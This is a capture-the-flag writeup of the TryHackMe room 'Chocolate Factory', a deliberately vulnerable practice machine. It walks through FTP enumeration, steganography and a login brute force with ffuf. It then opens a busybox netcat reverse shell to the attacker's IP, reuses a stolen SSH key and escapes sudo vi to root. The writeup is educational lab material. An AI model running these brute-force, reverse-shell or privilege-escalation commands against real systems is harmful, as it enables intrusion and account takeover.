---
title: "Chocolate Factory"
date: 2025-01-20
image: /assets/img/tryhackme/ChocolateFactory/ChocolateFactory_image.jpg
description: Writeup of the TryHackMe-CTF Chocolate Factory
categories: [Tryhackme, Easy]
tags: [bash, linux, scripting]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Plattform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Chocolate Factory</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/chocolatefactory">https://tryhackme.com/r/room/chocolatefactory</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge chocolate factory.  

## General Enumeration

The challenge introduction has a really huge image. I started with a steganography analysis of the image, but didn't got anywhere so moved over to nmap: 
```text
$ nmap -p- 10.10.197.226
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 04:58 EST
Nmap scan report for 10.10.197.226
Host is up (0.043s latency).
Not shown: 65506 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
100/tcp open  newacct
101/tcp open  hostname
102/tcp open  iso-tsap
103/tcp open  gppitnp
104/tcp open  acr-nema
105/tcp open  csnet-ns
106/tcp open  pop3pw
107/tcp open  rtelnet
108/tcp open  snagas
109/tcp open  pop2
110/tcp open  pop3
111/tcp open  rpcbind
112/tcp open  mcidas
113/tcp open  ident
114/tcp open  audionews
115/tcp open  sftp
116/tcp open  ansanotify
117/tcp open  uucp-path
118/tcp open  sqlserv
119/tcp open  nntp
120/tcp open  cfdptkt
121/tcp open  erpc
122/tcp open  smakynet
123/tcp open  ntp
124/tcp open  ansatrader
125/tcp open  locus-map
```
The server has a lot of open ports. Lets start with the ftp server, by using nmaps scripting engine:
```bash
$ nmap -A -p21 10.10.197.226
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 05:00 EST
Nmap scan report for 10.10.197.226
Host is up (0.038s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.21.63.26
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```
As we can see in the nmap output, the anonymous access is activated. I connected to the ftp server to see if we get something interesting: 
```bash
$ ftp anonymous@10.10.197.226
Connected to 10.10.197.226.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -al
229 Entering Extended Passive Mode (|||62672|)
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 .
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 ..
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.

ftp>
```
There was only one image which I downloaded to analyze it further. `Steghide` was able to extract data:
```bash
$ steghide --extract -sf gum_room.jpg
Enter passphrase:
wrote extracted data to "b64.txt".
```
Checking the file content and the file name a base64 decode gave me the cleartext:
```bash
$ cat b64.txt | base64 -d
[--- removed for readability ---]
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```
Since the structure of the file seems to be a shadow file, I tried to crack the hash with hashcat. But I canceled it after a few minutes and moved on.

## Webserver Enumeration
The next interesting port in the list is the web server. When we open the website, we see a login page.
To be sure, I did a gobuster directory enumeration, but found nothing there.

The shadow file gave us a username, so I tried to brute force the username with `ffuf`, and had success:
```bash
$ ffuf -w /usr/share/wordlists/rockyou.txt -X POST -d "uname=charlie&password=FUZZ&submit=Log+In" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.197.226/validate.php -fs 93

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.197.226/validate.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : uname=charlie&password=FUZZ&submit=Log+In
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 93
________________________________________________

[removed]                  [Status: 200, Size: 43, Words: 1, Lines: 1, Duration: 81ms]
```
The login was possible with the user name `charlie` and the brute forced password.
After logging in, we get a simple command execution page:

![command execution page](/assets/img/tryhackme/thm_chocolatefactory_1.png){: width="293" height="96" .w-75 .normal}

First enumerate the web server directory by simply running ls -al
```text
home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php
```
`key_rev_key` sounds interesting, so I downloaded it and analyzed what it is:
```bash
$ file key_rev_key
key_rev_key: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8273c8c59735121c0a12747aee7ecac1aabaf1f0, not stripped
```
Intersting, let's turn it into an executbale and run it:
```bash
$ chmod +x key_rev_key
$ ./key_rev_key
Enter your name: charlie
Bad name!
```
I tried to get some insights with `ltrace` and had success:
```bash
$ ltrace ./key_rev_key
printf("Enter your name: ")
__isoc99_scanf(0x563d5ea0090a, 0x7ffcf2e75a60, 0, 0Enter your name: test
)
strcmp("test", "[removed]")
puts("Bad name!"Bad name!
)
+++ exited (status 0) +++
$ ./key_rev_key
Enter your name: [removed]

 congratulations you have found the key:   b'[removed]'
 Keep its safe
```
Write the key down for later usage

## Reverse Shell
Before I tried to get a reverse shell I downloaded the index.php.bak file:
```html
$ cat index.php.bak
<html>
<body>
<form method="POST">
    <input id="comm" type="text" name="command" placeholder="Command">
    <button>Execute</button>
</form>
<?php
    if(isset($_POST['command']))
    {
        $cmd = $_POST['command'];
        echo shell_exec($cmd);
    }
?>
```
It seems to has no input filtering, so it is time to get a reverse shell. For that I used `busybox`:
```bash
busybox nc 10.21.63.26 9001 -e sh
```
And a simple Netcat listener:
```bash
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.21.63.26] from (UNKNOWN) [10.10.108.138] 47550
whoami
www-data
hostname
chocolate-factory
```
Before moving around perfom some stabilization:
```python
python -c 'import pty;pty.spawn("/bin/bash")'
```
Trying to get the user flag wasn't possible so we need to escalate to charlie first.
```bash
$ cat user.txt
cat: user.txt: Permission denied
```

## Privilege Escalation
While searching for a way to get `charlie` I found the following files:
```bash
-rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
$ cat teleport
-----BEGIN RSA PRIVATE KEY-----
[--- removed for readability ---]
-----END RSA PRIVATE KEY-----
```
I downloaded the rsa private key to use it for a ssh connection:
```bash
$ chmod 600 priv_key
$ ssh -i priv_key charlie@10.10.108.138
charlie@chocolate-factory:/$ whoami
charlie
```
This is how I was able to get the user flag, now get root.
I started by running `sudo -l` with the following result:
```bash
$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```
... a quick search in <a href="https://gtfobins.github.io/gtfobins/vi/">GFTOBins</a> made me root:
```bash
$ sudo vi -c ':!/bin/sh' /dev/null
#
# whoami
root
# cd /root
# ls
root.py
```
Interesting no root flag, but a root.py script:
```python
# cat root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
```
The script wants some key as the input parameter to give us the flag. Let's try the key we got earlyier:
```text
# python root.py
Enter the key: [removed]
__   __               _               _   _                 _____ _
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|

  ___                              ___   __
 / _ \__      ___ __   ___ _ __   / _ \ / _|
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_
| |_| |\ V  V /| | | |  __/ |    | |_| |  _|
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|


  ____ _                     _       _
 / ___| |__   ___   ___ ___ | | __ _| |_ ___
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|

 _____          _
|  ___|_ _  ___| |_ ___  _ __ _   _
| |_ / _` |/ __| __/ _ \| '__| | | |
|  _| (_| | (__| || (_) | |  | |_| |
|_|  \__,_|\___|\__\___/|_|   \__, |
                              |___/

flag{[removed]}
```

solved! :)
